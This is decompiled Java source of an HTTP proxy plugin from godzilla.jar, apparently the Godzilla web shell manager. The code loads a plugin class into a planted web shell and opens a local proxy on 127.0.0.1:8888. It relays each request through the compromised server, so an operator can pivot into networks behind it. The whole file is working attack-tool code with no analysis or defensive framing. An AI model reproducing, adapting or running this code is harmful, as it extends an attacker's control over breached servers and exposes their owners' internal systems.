/*     */ package shells.plugins.generic;
/*     */ 
/*     */ import com.httpProxy.server.CertPool;
/*     */ import com.httpProxy.server.core.HttpProxyHandle;
/*     */ import com.httpProxy.server.core.HttpProxyServer;
/*     */ import com.httpProxy.server.request.HttpRequest;
/*     */ import com.httpProxy.server.response.HttpResponse;
/*     */ import com.httpProxy.server.response.HttpResponseStatus;
/*     */ import core.ApplicationContext;
/*     */ import core.Encoding;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.ByteArrayOutputStream;
/*     */ import java.io.IOException;
/*     */ import java.io.PrintStream;
/*     */ import java.net.InetAddress;
/*     */ import java.net.Socket;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTextField;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public abstract class HttpProxy
/*     */   implements Plugin, HttpProxyHandle
/*     */ {
/*     */   private final JPanel panel;
/*     */   private final RTextArea tipTextArea;
/*     */   private final JButton stopButton;
/*     */   private final JButton startButton;
/*     */   private final JLabel hostLabel;
/*     */   private final JLabel portLabel;
/*     */   private final JTextField hostTextField;
/*     */   private final JTextField portTextField;
/*     */   private final JSplitPane httpProxySplitPane;
/*     */   private boolean loadState;
/*     */   private ShellEntity shellEntity;
/*     */   private Payload payload;
/*     */   private Encoding encoding;
/*     */   private HttpProxyServer httpProxyServer;
/*     */   
/*     */   public HttpProxy() {
/*  58 */     this.panel = new JPanel(new BorderLayout());
/*     */     
/*  60 */     this.hostLabel = new JLabel("host :");
/*  61 */     this.portLabel = new JLabel("port :");
/*  62 */     this.startButton = new JButton("Start");
/*  63 */     this.stopButton = new JButton("Stop");
/*  64 */     this.hostTextField = new JTextField("127.0.0.1", 15);
/*  65 */     this.portTextField = new JTextField("8888", 7);
/*  66 */     this.tipTextArea = new RTextArea();
/*  67 */     this.httpProxySplitPane = new JSplitPane();
/*     */     
/*  69 */     this.httpProxySplitPane.setOrientation(0);
/*  70 */     this.httpProxySplitPane.setDividerSize(0);
/*     */ 
/*     */     
/*  73 */     this.tipTextArea.append("Logs:\r\n");
/*     */     
/*  75 */     JPanel httpProxyTopPanel = new JPanel();
/*  76 */     httpProxyTopPanel.add(this.hostLabel);
/*  77 */     httpProxyTopPanel.add(this.hostTextField);
/*  78 */     httpProxyTopPanel.add(this.portLabel);
/*  79 */     httpProxyTopPanel.add(this.portTextField);
/*  80 */     httpProxyTopPanel.add(this.startButton);
/*  81 */     httpProxyTopPanel.add(this.stopButton);
/*     */     
/*  83 */     this.httpProxySplitPane.setTopComponent(httpProxyTopPanel);
/*  84 */     this.httpProxySplitPane.setBottomComponent(new JScrollPane((Component)this.tipTextArea));
/*     */ 
/*     */     
/*  87 */     this.panel.add(this.httpProxySplitPane);
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean load() {
/*  92 */     if (!this.loadState) {
/*     */       try {
/*  94 */         byte[] data = readPlugin();
/*  95 */         if (this.payload.include(getClassName(), data)) {
/*  96 */           this.loadState = true;
/*  97 */           Log.log("Load success", new Object[0]);
/*  98 */           this.tipTextArea.append("Load success\r\n");
/*  99 */           return true;
/*     */         } 
/* 101 */         Log.error("Load fail");
/* 102 */         this.tipTextArea.append("Load fail\r\n");
/* 103 */         return false;
/*     */       }
/* 105 */       catch (Exception e) {
/* 106 */         Log.error(e);
/* 107 */         return false;
/*     */       } 
/*     */     }
/*     */     
/* 111 */     return true;
/*     */   }
/*     */   
/*     */   public abstract byte[] readPlugin() throws IOException;
/*     */   
/*     */   public abstract String getClassName();
/*     */   
/*     */   public void handler(Socket clientSocket, HttpRequest httpRequest) throws Exception {
/* 119 */     HttpResponse response = sendHttpRequest(httpRequest);
/* 120 */     String logMessage = String.format("Time:%s Url:%s httpMehtod:%s HttpVersion:%s requestBodySize:%s responseCode:%s responseBodySize:%s\r\n", new Object[] { functions.getCurrentTime(), httpRequest.getUrl(), httpRequest.getMethod(), httpRequest.getHttpVersion(), (httpRequest.getRequestData() == null) ? "0" : Integer.valueOf((httpRequest.getRequestData()).length), Integer.valueOf(response.getHttpResponseStatus().code()), (response.getResponseData() == null) ? "0" : Integer.valueOf((response.getResponseData()).length) });
/* 121 */     Log.log(logMessage, new Object[0]);
/* 122 */     this.tipTextArea.append(logMessage);
/* 123 */     clientSocket.getOutputStream().write(response.encode());
/*     */   }
/*     */   
/*     */   public HttpResponse sendHttpRequest(HttpRequest httpRequest) {
/* 127 */     httpRequest.getHttpRequestHeader().setHeader("Connection", "close");
/*     */     
/* 129 */     ReqParameter reqParameter = new ReqParameter();
/* 130 */     reqParameter.add("httpUri", httpRequest.getUri());
/* 131 */     reqParameter.add("httpUrl", httpRequest.getUrl());
/* 132 */     reqParameter.add("httpMehtod", httpRequest.getMethod());
/* 133 */     reqParameter.add("httpHeaders", httpRequest.getHttpRequestHeader().decode());
/* 134 */     reqParameter.add("HttpVersion", httpRequest.getHttpVersion());
/* 135 */     reqParameter.add("httpHost", httpRequest.getHost());
/* 136 */     reqParameter.add("httpPort", String.valueOf(httpRequest.getPort()));
/* 137 */     if (httpRequest.getRequestData() != null) {
/* 138 */       reqParameter.add("httpRequestData", httpRequest.getRequestData());
/*     */     }
/* 140 */     byte[] response = this.payload.evalFunc(getClassName(), "httpRequestProxy", reqParameter);
/* 141 */     HttpResponse httpResponse = null;
/*     */     try {
/* 143 */       httpResponse = HttpResponse.decode(response);
/* 144 */       if (httpResponse.getHttpResponseStatus().getCode() == HttpResponseStatus.CONTINUE.code()) {
/* 145 */         httpResponse = HttpResponse.decode(httpResponse.getResponseData());
/*     */       }
/* 147 */       httpResponse.getHttpResponseHeader().setHeader("Connection", "close");
/*     */       
/* 149 */       httpResponse.getHttpResponseHeader().removeHeader("Transfer-Encoding");
/* 150 */     } catch (Exception e) {
/* 151 */       ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
/* 152 */       PrintStream printStream = new PrintStream(byteArrayOutputStream);
/* 153 */       e.printStackTrace(printStream);
/* 154 */       printStream.flush();
/* 155 */       printStream.close();
/*     */       
/*     */       try {
/* 158 */         byteArrayOutputStream.write("\r\n".getBytes());
/* 159 */         byteArrayOutputStream.write("response ->\r\n".getBytes());
/* 160 */         byteArrayOutputStream.write((response == null) ? "null".getBytes() : response);
/* 161 */       } catch (Exception exception) {}
/*     */ 
/*     */ 
/*     */       
/* 165 */       httpResponse = new HttpResponse(HttpResponseStatus.INTERNAL_SERVER_ERROR, null, byteArrayOutputStream.toByteArray());
/*     */       try {
/* 167 */         byteArrayOutputStream.close();
/* 168 */       } catch (IOException ioException) {
/* 169 */         ioException.printStackTrace();
/*     */       } 
/*     */     } 
/* 172 */     return httpResponse;
/*     */   }
/*     */   
/*     */   private void startButtonClick(ActionEvent actionEvent) throws Exception {
/* 176 */     load();
/* 177 */     if (this.httpProxyServer == null) {
/*     */       
/* 179 */       int listenPort = Integer.valueOf(this.portTextField.getText().trim()).intValue();
/* 180 */       InetAddress bindAddr = InetAddress.getByName(this.hostTextField.getText().trim());
/*     */       
/* 182 */       CertPool certPool = new CertPool(ApplicationContext.getHttpsPrivateKey(), ApplicationContext.getHttpsCert());
/*     */       
/* 184 */       this.httpProxyServer = new HttpProxyServer(listenPort, 50, bindAddr, certPool, this);
/*     */       
/* 186 */       if (this.httpProxyServer.startup()) {
/* 187 */         this.tipTextArea.append(String.format("start! bindAddr: %s listenPort: %s\r\n", new Object[] { bindAddr.getHostAddress(), Integer.valueOf(listenPort) }));
/* 188 */         GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "start!", "提示", 1);
/*     */       } else {
/* 190 */         this.httpProxyServer = null;
/* 191 */         GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "fail!", "提示", 1);
/*     */       } 
/*     */     } else {
/*     */       
/* 195 */       GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "started!", "提示", 2);
/*     */     } 
/*     */   }
/*     */   private void stopButtonClick(ActionEvent actionEvent) {
/* 199 */     if (this.httpProxyServer == null) {
/* 200 */       GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "no start!", "提示", 2);
/*     */     } else {
/* 202 */       this.httpProxyServer.setNextSocket(false);
/* 203 */       this.httpProxyServer.shutdown();
/* 204 */       this.httpProxyServer = null;
/* 205 */       this.tipTextArea.append("stop!\r\n");
/* 206 */       GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "stop!", "提示", 1);
/*     */     } 
/*     */   }
/*     */   
/*     */   public void closePlugin() {
/*     */     try {
/* 212 */       if (this.httpProxyServer != null) {
/* 213 */         this.httpProxyServer.setNextSocket(false);
/* 214 */         this.httpProxyServer.shutdown();
/* 215 */         this.httpProxyServer = null;
/*     */       } 
/* 217 */     } catch (Exception e) {
/* 218 */       Log.error(e);
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 225 */     this.shellEntity = shellEntity;
/* 226 */     this.payload = this.shellEntity.getPayloadModule();
/* 227 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 228 */     automaticBindClick.bindJButtonClick(HttpProxy.class, this, HttpProxy.class, this);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 234 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\generic\HttpProxy.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */